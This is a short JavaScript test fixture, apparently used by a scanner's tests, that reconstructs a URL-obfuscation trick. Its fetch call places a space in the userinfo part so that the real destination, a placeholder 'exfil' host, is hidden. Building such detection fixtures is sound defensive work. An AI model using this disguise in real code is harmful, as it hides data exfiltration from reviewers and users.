// DEFANGED RECONSTRUCTION for the userinfo-space evasion.
// Synthetic, not a historical artifact. Parsed by capdelta tests only; never
// imported, installed, or executed.
// Kept: a fetch whose URL hides the destination after a userinfo space.
// Omitted: every network call; the host is a reserved .example.test name.
module.exports = function run() {
  return fetch("https://cdn example@exfil.example.test/c");
};
